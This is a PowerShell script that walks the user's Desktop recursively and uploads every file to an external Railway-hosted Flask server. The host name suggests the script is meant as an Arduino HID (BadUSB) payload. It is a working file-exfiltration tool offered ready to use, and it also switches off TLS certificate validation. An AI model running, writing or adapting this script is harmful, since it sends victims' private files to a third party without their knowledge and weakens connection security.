# CONFIGURATION
$DesktopPath = [Environment]::GetFolderPath("Desktop")
$Url = "https://arduinohidtesting-production.up.railway.app/upload"  # Update this to your actual Railway URL

# Get all files recursively
$Files = Get-ChildItem -Path $DesktopPath -Recurse -File

# Function to upload file with SSL/TLS security protocol
function Send-FileToFlask {
    param(
        [string]$Uri,
        [string]$FilePath
    )
    
    try {
        # Force TLS 1.2 protocol for secure connections
        [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
        
        $webClient = New-Object System.Net.WebClient
        
        # Create a form field with the name "file" that Flask expects by default
        $fieldName = "file"
        
        # Create multipart/form-data
        $boundary = [System.Guid]::NewGuid().ToString()
        $LF = "`r`n"
        $bodyLines = New-Object System.Collections.ArrayList
        
        # Add file data
        $fileBytes = [System.IO.File]::ReadAllBytes($FilePath)
        $fileName = [System.IO.Path]::GetFileName($FilePath)
        
        $webClient.Headers.Add("Content-Type", "multipart/form-data; boundary=$boundary")
        
        # Construct the multipart form body
        [void]$bodyLines.Add("--$boundary")
        [void]$bodyLines.Add("Content-Disposition: form-data; name=`"$fieldName`"; filename=`"$fileName`"")
        [void]$bodyLines.Add("Content-Type: application/octet-stream")
        [void]$bodyLines.Add("")
        $bodyLinesString = $bodyLines -join $LF
        
        # Convert body lines to bytes
        $bodyBytes = [System.Text.Encoding]::ASCII.GetBytes($bodyLinesString + $LF)
        
        # Add closing boundary
        $endBytes = [System.Text.Encoding]::ASCII.GetBytes("$LF--$boundary--$LF")
        
        # Combine all bytes
        $requestBytes = New-Object System.Collections.ArrayList
        [void]$requestBytes.AddRange($bodyBytes)
        [void]$requestBytes.AddRange($fileBytes)
        [void]$requestBytes.AddRange($endBytes)
        
        # Log attempt to upload
        Write-Host "Attempting to upload to: $Uri"
        
        # Disable SSL certificate validation (only do this for testing)
        # Remove this in production environments
        [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
        
        # Send the data
        $response = $webClient.UploadData($Uri, "POST", $requestBytes.ToArray())
        
        return [System.Text.Encoding]::ASCII.GetString($response)
    }
    catch {
        # More detailed error reporting
        Write-Warning "Error Type: $($_.Exception.GetType().FullName)"
        Write-Warning "Error Message: $($_.Exception.Message)"
        if ($_.Exception.InnerException) {
            Write-Warning "Inner Error: $($_.Exception.InnerException.Message)"
        }
        throw $_
    }
}

foreach ($File in $Files) {
    try {
        Write-Host "Uploading: $($File.FullName)"
        
        # This method is optimized for Flask servers and works across PowerShell versions
        $result = Send-FileToFlask -Uri $Url -FilePath $File.FullName
        
        Write-Host "Uploaded: $($File.Name)"
        Write-Host "Server response: $result`n"
    }
    catch {
        Write-Warning "Failed to upload: $($File.FullName). Error: $_"
    }
}

